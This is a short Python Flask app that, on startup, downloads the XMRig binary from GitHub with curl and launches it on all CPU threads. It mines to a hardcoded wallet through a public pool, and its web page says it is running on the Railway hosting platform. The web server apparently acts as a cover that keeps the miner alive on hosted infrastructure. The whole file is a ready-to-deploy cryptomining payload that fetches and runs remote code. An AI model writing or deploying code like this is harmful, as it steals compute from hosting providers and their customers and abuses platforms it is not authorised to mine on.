import os
import subprocess
import threading
from flask import Flask

app = Flask(__name__)

# Configuration
WALLET = "SaLvdUFXatp5x7yDhRhqrgL9wYNaj379vj1jdwWUKY6GDXKVxachcFV9R4qUAziZtGDgNCQJVQwrkGhD7VjknpSCbH5p8kwbReo"
POOL = "in.salvium.herominers.com:1230"
ALGO = "rx/0"
PASS = "web"

def install_and_run_miner():
    try:
        if not os.path.exists("xmrig"):
            print("[+] Downloading XMRig...")
            os.system("curl -L -o xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz")
            os.system("tar -xf xmrig.tar.gz")
            os.system("mv xmrig-6.24.0/xmrig .")
            os.system("chmod +x xmrig")

        threads = str(os.cpu_count() or 1)
        print(f"[+] Starting miner with {threads} thread(s)...")

        subprocess.Popen([
            "./xmrig",
            "-a", ALGO,
            "-o", POOL,
            "-u", WALLET,
            "-p", PASS,
            "--threads", threads
        ])
    except Exception as e:
        print("❌ Failed to launch miner:", e)

@app.route('/')
def index():
    return "🧠 XMRig Miner is running on Railway with optimized settings. Check Railway logs for hashrate."

if __name__ == '__main__':
    threading.Thread(target=install_and_run_miner).start()
    app.run(host='0.0.0.0', port=8080)
